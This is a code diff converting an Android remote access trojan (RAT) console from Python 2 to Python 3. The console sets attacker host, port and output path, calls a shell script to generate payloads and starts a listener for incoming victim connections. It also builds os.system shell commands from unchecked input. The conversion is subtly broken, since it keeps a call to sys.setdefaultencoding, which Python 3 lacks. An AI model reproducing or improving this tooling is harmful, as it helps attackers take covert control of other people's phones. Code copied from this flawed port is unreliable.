@@ -6,7 +6,8 @@ B = '\033[1;34m' #Blue
 G = '\033[32m' # Green
 import os, sys, subprocess
 from time import sleep
-reload(sys)
+import importlib
+importlib.reload(sys)
 sys.setdefaultencoding("utf-8")
 
 host = " "
@@ -31,7 +32,7 @@ def main():
     global host, port, output
 
     while True:
-        cmd = raw_input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/android_remote_acces "+G+"(RAT)"+N+"): ").lower()
+        cmd = input(""+N+"Pentest>> ("+B+"modules/exploits)("+R+"exploit/android_remote_acces "+G+"(RAT)"+N+"): ").lower()
         if cmd == "show options":
             help()
         elif cmd =='back':
@@ -46,30 +47,30 @@ def main():
 
         elif "set host" in cmd:
             host = cmd.split()[-1]
-            print " HOST "+R+"=> "+N+"",cmd.split()[-1]
+            print(" HOST "+R+"=> "+N+"",cmd.split()[-1])
 
         elif "set port" in cmd:
             port = int(cmd.split()[-1])
-            print " PORT "+R+"=> "+N+"",cmd.split()[-1]
+            print(" PORT "+R+"=> "+N+"",cmd.split()[-1])
 
         elif "set path" in cmd:
             output = cmd.split()[-1]
-            print " PATH "+R+"=> "+N+"",cmd.split()[-1]
+            print(" PATH "+R+"=> "+N+"",cmd.split()[-1])
 
         elif cmd == "show info":
-            print "\nHOST   => %s\nPORT   => %s\nPATH   => %s\n"%(host, port,output)
+            print("\nHOST   => %s\nPORT   => %s\nPATH   => %s\n"%(host, port,output))
 
         elif cmd == "generate" or cmd == "payloads":
             if host != " " and port != " " and output != " ":
                 sleep(1)
-                print("\nHOST   => "+host+"\nPORT   => "+str(port)+"\nPATH   => "+output)
+                print(("\nHOST   => "+host+"\nPORT   => "+str(port)+"\nPATH   => "+output))
                 sleep(3)
                 os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
-                print("\n"+R+"["+B+"*"+R+"]"+N+" Payloads succes with 762 bytes...")
+                print(("\n"+R+"["+B+"*"+R+"]"+N+" Payloads succes with 762 bytes..."))
                 sleep(1)
                 main()
             else:
-                print "\nHOST   => %s \nPORT   => %s \nPATH   => %s" %(host,port,output)
+                print("\nHOST   => %s \nPORT   => %s \nPATH   => %s" %(host,port,output))
 
         elif cmd == "exploit" or cmd == "run" or cmd == "start listener":
             if host != " " and port != " ":
@@ -78,16 +79,16 @@ def main():
                 else:
                     os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
             else:
-                print "\nHost => %s\nPort => %s\n"%(host,port)
+                print("\nHost => %s\nPort => %s\n"%(host,port))
         else:
-            print(""+R+"["+B+"*"+R+"]"+N+" Keywoard Intrupped!")
+            print((""+R+"["+B+"*"+R+"]"+N+" Keywoard Intrupped!"))
             main()
 
 def contol():
     try:
         main()
     except KeyboardInterrupt:
-        print("\n"+R+"["+B+"*"+R+"]"+N+" exiting...")
+        print(("\n"+R+"["+B+"*"+R+"]"+N+" exiting..."))
         sleep(2)
         sys.exit()
 if __name__ == "__main__":
